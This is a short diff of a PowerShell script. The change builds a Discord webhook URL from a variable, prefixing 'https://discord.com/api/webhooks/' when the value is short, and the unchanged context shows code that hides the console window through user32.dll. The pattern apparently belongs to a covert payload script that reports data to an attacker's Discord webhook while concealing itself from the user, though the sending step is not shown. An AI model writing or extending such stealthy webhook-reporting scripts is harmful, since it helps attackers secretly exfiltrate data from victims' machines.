@@ -1,4 +1,7 @@
-$hookurl = "$dc" # YOUR_WEBHOOK_HERE
+$hookurl = "$dc"
+if ($hookurl.Length -lt 120){
+	$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
 # Hide the console
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
